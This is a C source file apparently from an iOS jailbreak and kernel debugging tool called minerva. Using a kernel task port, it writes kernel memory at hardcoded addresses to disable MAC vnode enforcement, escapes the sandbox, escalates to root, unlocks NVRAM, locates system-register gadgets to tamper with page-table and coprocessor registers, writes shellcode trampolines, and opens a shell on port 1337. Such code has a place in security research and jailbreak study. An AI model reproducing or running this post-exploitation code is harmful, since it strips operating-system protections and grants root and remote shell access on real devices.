//
//  minerva.c
//  minervadebugger
//
//  Created by Sem Voigtländer on 5/5/19.
//  Copyright © 2019 Sem Voigtländer. All rights reserved.
//

#include "minerva.h"
#include <UIKit/UIKit.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <dirent.h>
#include <errno.h>
#include <dlfcn.h>

#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/cdefs.h>
#include <sys/queue.h>
#include <sys/ucred.h>
#include <sys/mount.h>
#include <sys/lock.h>
#include <sys/time.h>
#include <sys/uio.h>

#include <mach-o/loader.h>
#include <kernel/machhelpers.h>
#include <mach/mach.h>

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/hid/IOHIDEventSystem.h>

#include <jelbrek/jelbrek.h>
#include "patchfinder.h"
#include "xnu-header.h"
#include "pwnvfspolicy.h"
#include "sbsuspend.h"
#include "serial.h"
#include "videoconsole.h"
#include "debugutils.h"
#include "physutils.h"
#include "kutils.h"
#include "offsets.h"
#include "kerneldec.h"
#include "devicetree.h"
#include "defeat.h"
#include "mshell.h"

mach_vm_address_t soc_base = 0;
mach_vm_address_t amcc_base = 0;
mach_vm_address_t cpacr_gadget = 0;
mach_vm_address_t ttbr0_el1_gadget = 0;
mach_vm_address_t ttbr1_el1_gadget = 0;

#define SUPER_PRINTF(fmt, ...){\
printf(fmt, __VA_ARGS__);\
serial_printf(fmt, __VA_ARGS__);\
}


void hexdump(uint8_t buffer[], int len)
{
    int HEXDUMP_LINE_LEN = 16;
    int i;
    char s[HEXDUMP_LINE_LEN+1];
    bzero(s, HEXDUMP_LINE_LEN+1);
    
    for(i=0; i < len; i++) {
        if (!(i%HEXDUMP_LINE_LEN)) {
            if (s[0])
                SUPER_PRINTF("[%s]",s);
            SUPER_PRINTF("\n%05x: ", i);
            bzero(s, HEXDUMP_LINE_LEN);
        }
        s[i%HEXDUMP_LINE_LEN]=isprint(buffer[i])?buffer[i]:'.';
        SUPER_PRINTF("%02x ", buffer[i]);
    }
    while(i++%HEXDUMP_LINE_LEN)
        SUPER_PRINTF("%s","   ");
    
    SUPER_PRINTF("[%s]\n", s);
}

void loosen_macpolicies(void){
    printf("Loosening MAC policies...\n");
    WriteAnywhere32(SLIDADDR(0xFFFFFFF0075FF710), 0x0); // Patch mac policy vnode_enforce
    SUPER_PRINTF("So did we disable vnode_enforce? %s\n", ReadAnywhere32(SLIDADDR(0xFFFFFFF0075FF710)) == 0 ? "yes" : "nope :(");
}

void find_socbase(void){
    soc_base = ReadAnywhere64(SLIDADDR(0xFFFFFFF007674040));
    mach_vm_address_t entryP = 0;
    sleep(1);
    printf("SoC: %#llx\n", soc_base);
    DTFindEntry("name", "mcc", &entryP);
    printf("Entry: %#llx\n", soc_base);
    mach_vm_address_t reg_prop = 0;
    mach_vm_size_t prop_size = 0;
    printf("Reg prop: %#llx\n", soc_base);
    DTGetProperty(entryP, "reg", &reg_prop, &prop_size);
    sleep(1);
}

// Uses my patchfinder extensions for finding system instructions
void find_sysgadgets(void){
    printf("Finding ARM64 system instructions...\n");
    cpacr_gadget = find_cpacr_write();                      //set coprocessor active control register
    minerva_info("cpacr at: %#llx (%#llx)\n", cpacr_gadget, UNSLIDADDR(cpacr_gadget));
    
    ttbr0_el1_gadget = find_ttbr0_el1_write();
    minerva_info("msr ttbr0_el1, x0 at: %#llx (%#llx)\n", ttbr0_el1_gadget, UNSLIDADDR(ttbr0_el1_gadget));    // set translation table base register 0

    ttbr1_el1_gadget = find_ttbr1_el1_write();
    minerva_info("msr ttbr1_el1, x0 at: %#llx (%#llx)\n", ttbr1_el1_gadget, UNSLIDADDR(ttbr1_el1_gadget));    // set translation table base register 1
    
}

void set_tlb0(mach_vm_address_t addr){  // Set firstlevel pagetable entries
    printf("About to set Translation Table Base 0 to: %#llx\n", addr);
    sleep(1);
    Kernel_Execute(ttbr0_el1_gadget, addr, 0, 0, 0, 0, 0, 0);
}

void set_tlb1(mach_vm_address_t addr){ // Set second level pagetable entries
    printf("About to set Translation Table Base 1 to: %#llx\n", addr);
    sleep(1);
    Kernel_Execute(ttbr1_el1_gadget, addr, 0, 0, 0, 0, 0, 0);
}

void set_cpacr(mach_vm_address_t addr){ // Set co-processor active control register (Makes KPP angry)
    printf("About to violate cpacr with address: %#llx\n", addr);
    sleep(1);
    Kernel_Execute(cpacr_gadget, addr, 0, 0, 0, 0, 0, 0);
}

mach_vm_address_t kstring(const char *string){  // Dirty in-kernel string creation
    mach_vm_address_t kaddr = 0;
    size_t len = strlen(string);
    kaddr = Kernel_alloc(len*sizeof(char));
    copyout(kaddr, (void*)string, len);
    return kaddr;
}


// Doubt this works, but is supposed to dump SRAM
void dump_sram(void){
    printf("Dumping SRAM...\n");
    mach_vm_address_t sramvirt = Kernel_alloc(SRAM_BANK_LEN);       // Allocate virtual memory to copy sram to
    uint8_t dump[SRAM_BANK_LEN] = {};
    bcopy_phys(kvtophys(sramvirt), SRAM_BASE+slide, SRAM_BANK_LEN);
    if(sramvirt){
        copyin(&dump, sramvirt, SRAM_BANK_LEN);
        Kernel_free(sramvirt, SRAM_BANK_LEN);
        sramvirt = 0;
        hexdump(dump, SRAM_BANK_LEN);
    }
}

void other_stuff(void){
    mach_vm_address_t options = 0;
    DTLookupEntry(0, "/options", &options);
    mach_vm_address_t isProdFused = 0;
    uint64_t size = 0;
    DTGetProperty(options, "94b73556-2197-4702-82a8-3e1337dafbfb:EffectiveProductionStatus", &isProdFused, &size);
    printf("is production fused: %#x\n", ReadAnywhere32(isProdFused));
}

void clear_documentsdir(void){
    NSString* docsdir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    for(NSString* doc in [NSFileManager.defaultManager contentsOfDirectoryAtPath:docsdir error:nil]){
        printf("Clearing %s...\n", (char*)doc.UTF8String);
        [NSFileManager.defaultManager removeItemAtPath:[doc stringByAppendingPathComponent:doc] error:nil];
    }
}

bool canRead(const char *file) {
    NSString *path = @(file);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    return ([fileManager attributesOfItemAtPath:path error:nil]);
}

uint64_t physalloc(uint64_t size) {
    uint64_t ret = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t*) &ret, size, VM_FLAGS_ANYWHERE);
    return ret;
}

typedef struct KTRR_REGION_INFO {
    kaddr_t start;
    kaddr_t end;
    kaddr_t lock;
} ktrr_region_info_t;


void find_ktrr_region_info(ktrr_region_info_t* info){
    if(info){
     //       info->start =
    }
}

// Our main stage
kern_return_t minerva_init(void)
{
    kern_return_t err = KERN_SUCCESS;
    minerva_info("Initializing minerva...\n", NULL);
    
    // Get the kernel port
    err = get_kernelport(&escalation);
    if(err) {
        minerva_error("Failed to get kernel taskport: %s.\n", mach_error_string(err));
        return err;
    }
    
    //Get kernel base and slide
    err = get_kbase_and_slide(&escalation);
    if(err) {
         minerva_error("Failed to get kernel slide and base: %s.\n", mach_error_string(err));
        return err;
    }
    
    // Initialize jelbreklib
    err = init_with_kbase(tfp0, kbase);
    if(err != KERN_SUCCESS)
    {
        minerva_error("Failed to initialize jelbreklib: %s.\n", mach_error_string(err));
    }
    
    // Allow us get tasks of processes
    // Allow us to use task_for_pid
    // Allow running unsigned code
    // Allow us to debug apps
    
    // Let us run without a sandbox restriction
    err = !unsandbox(getpid());
    if(err != KERN_SUCCESS)
    {
        minerva_error("Failed to escape the sandbox: %s.\n", mach_error_string(err));
    }
    
    // Give us root privileges
    err = !rootify(getpid());
    if(err != KERN_SUCCESS)
    {
        minerva_error("Failed to escalate to the root user: %s.\n", mach_error_string(err));
    }
    
    //Mark ourselves as platform binary
    platformize(getpid());

    // Copy kernel header and loadcommands
    bool magic = (ReadAnywhere32(kbase) == 0xfeedfacf);
    minerva_info("Kernel mach-o magic: %s!\n", magic ? "valid" : "invalid");
    if(!magic){
        err = KERN_FAILURE;
        minerva_error("Kernel magic is invalid. Exiting...\n", NULL);
        term_jelbrek();
        exit(1);
        return err;
    }
    minerva_info("Initializing patchfinder..\n",nil);
    const char *original_kernel_cache_path = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
    const char *decompressed_kernel_cache_path = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kernelcache.dec"].UTF8String;
    
    
    if(!canRead(decompressed_kernel_cache_path)){
        if (!canRead(original_kernel_cache_path)) {
         return KERN_FAILURE;
        }
        FILE *original_kernel_cache = fopen(original_kernel_cache_path, "rb");
        if(!original_kernel_cache){
            return KERN_FAILURE;
        }
        FILE *decompressed_kernel_cache = fopen(decompressed_kernel_cache_path, "w+b");
        if(decompress_kernel(original_kernel_cache, decompressed_kernel_cache, NULL, true) != KERN_SUCCESS){
            return KERN_FAILURE;
        }
        fclose(decompressed_kernel_cache);
        fclose(original_kernel_cache);
    }
    
    init_kernel(KernelRead, kbase, NULL); // Initialize patchfinder with the kernelbase

    minerva_info("Unlocking the NVRAM...\n", nil);
    UnlockNVRAM(); // Unlock the NVRAM
    
    minerva_info("Loosening mac policies...\n", nil);
    loosen_macpolicies(); // Patch MAC policies to loosen security

    minerva_info("Finding system instructions...\n", nil);
    find_sysgadgets(); // Find all system gadgets
    
    minerva_info("Patching the virtual filesystem to have /AppleInternal...\n", nil);
  //  pwnvfs_make_appleinternal(); // PWN the virtual filesystem to have a /AppleInternal directory
    
    minerva_warn("(Re)Initializing platform...\n", nil);
//    PE_initialize_platform(FALSE, 0);  // Reinit platform, 0 = use bootArgs constant from offsets
    
    minerva_info("Initializing serial output...\n", nil);
    // KernelWrite_32bits(0xFFFFFFF007095CF0+slide, 0);  // We can't patch data const :(

  
    serial_init();
    console_init();
    PE_init_printf();
    
    PE_init_console(0, kPEReleaseScreen);
    PE_init_console(0, kPEDisableScreen);
    PE_init_console(0, kPEAcquireScreen);
    PE_init_console(0, kPETextScreen);
    PE_init_console(0, kPETextMode);
    
   // KernelWrite_64bits(SYMOFF(_PE_PANIC_DEBUGGING_ENABLED), 0x1);
  //  KernelWrite_64bits(SYMOFF(_PE_ARM_DEBUG_PANIC_HOOK), SYMOFF(_NULLOP));
    
   
    //PE_init_console(0, kPETextScreen);
//    PE_init_console(0, kPEDisableScreen);   // Initialization of the videoconsole screen
        // We want a video console to be enabled
    
 //   PE_init_console(0, kPEDisableScreen); // Serial for now
  //  PE_init_console(0, kPERefreshBootGraphics);
    // Just some example of serial prints, might be UART only idk
   
    serial_print("\n");
    serial_print("Debugger is on\n");
    serial_print("Welcome to @userlandkernel's Serial Log implementation. Have fun!\n");
    
    
    // We can use KPRINT for printing kernel strings, but remember its pretty dirty as it uses strlen()
    mach_vm_address_t bootargs = ReadAnywhere64(PATCHOFF(BOOTARGS));
    if(bootargs){
        serial_print("Boot arguments: ");
        serial_kprint(bootargs);
        serial_print("\n");
    }
    serial_print("Initializing the serial output...\n");
   
    // Finally enable the graphic console
    serial_print("Turning the graphical console on...\n");
   // gc_enable(TRUE);
    
    // Finally enable video console
    serial_print("Turning the video console on...\n");
   // vc_enable(TRUE);
 
    serial_print("\n");
    serial_kprint(kstring("We out here\n"));
    
    // Print some kernel information to the serial console.
    serial_print("==========================================================\n");
    serial_print("Kernel: ");
    serial_kprint(SYMOFF(_VERSION));
    serial_print("\n");
    serial_printf("Boot CPU: %#x\n", ml_get_boot_cpu_number());
    serial_printf("Current CPU: %#x\n", ml_get_cpu_number());
    serial_printf("CPU count: %#x\n", ml_get_cpucount());
    serial_printf("Hardware interrupts: %s\n", ml_get_interrupts_enabled() ? "enabled" : "disabled");
    serial_printf("Kernel virtual base: %#llx\n", KernelBase);
    serial_printf("Kernel physical base: %#llx\n", kvtophys(KernelBase));
    serial_printf("Panic debugging: %#x\n", ReadAnywhere32(PATCHOFF(ENABLE_PANICDBG)));
    serial_printf("SoC Physical base: %#llx\n", ReadAnywhere64(SLIDADDR(0xFFFFFFF007674040)));
    serial_printf("SoC Virtual base: %#llx\n", phystokv(ReadAnywhere64(SLIDADDR(0xFFFFFFF007674040))));
    serial_printf("gPhysBase: %#llx\n", find_gPhysBase());
    serial_printf("TCR read access: %#llx\n", find_tcr_el1_read());
    serial_printf("TCR write access: %#llx\n", find_tcr_el1_write());
    serial_print("==========================================================\n");
    
    serial_print("\nAbout to fire the nukes...\n");
    
    uint64_t entryp = SLIDADDR(find_entry());
    serial_printf("Found entry: %#llx\n", entryp);
    uint64_t rvbar = entryp & (~0xFFF); // virtual base address register
    sleep(1);
    serial_printf("Found vbar register at: %#llx\n", rvbar);
    uint64_t cpul = find_register_value(rvbar+0x40, 1);
    sleep(1);
    serial_printf("Found cpul: %#llx\n", cpul);
    uint64_t optr = find_register_value(rvbar+0x50, 20);
    serial_printf("Found optr: %#llx\n", optr);
    sleep(1);
    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - ReadAnywhere64(SLIDADDR(0xFFFFFFF007674040)) + phystokv(ReadAnywhere64(SLIDADDR(0xFFFFFFF007674040)));
    serial_printf("Found cpu list: %#llx\n", cpu_list);
    sleep(1);
    uint64_t cpu = ReadAnywhere64(cpu_list);
    serial_printf("Found cpu: %#llx\n", cpu);
    
    uint64_t shellcode = physalloc(0x4000);
    
    /*
     ldr x30, a
     ldr x0, b
     br x0
     nop
     a:
     .quad 0
     b:
     .quad 0
     none of that squad shit tho, straight gang shit. free rondonumbanine
     */
    
    WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
    
    WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
    
    sleep(1);
    serial_print("3. ");
    sleep(1);
    serial_print("2. ");
    sleep(1);
    serial_print("1. ");
    
    mach_vm_address_t threads[10];
     char c = 'A';
    for(int i = 1; i < 10; i++){
        SUPER_PRINTF("SERIAL_PUTC kernel thread #%d\n\n", i);
        kernel_thread_start_priority(SYMOFF(_SERIAL_PUTC), c++, MAXPRI_KERNEL, &threads[i-1]);
    }
    serial_print("Thread test succeeded!\n");
    
    set_tcr(KERN_SUCCESS);
   // backboardd_screensetup();
   // find_socbase(); // Panics, DT function wrappers are broken lol
    printf("Preparing shell...\n");
    sleep(3);
    err = run_mshell(1337, NULL);
    
    SUPER_PRINTF("Running MSHELL on port 1337 %s", err == KERN_SUCCESS ? "succeeded!\n" : "failed.\n");
    
   // term_kernel();
    //term_jelbrek();
    
   // exit(0);
    return err;
    
}
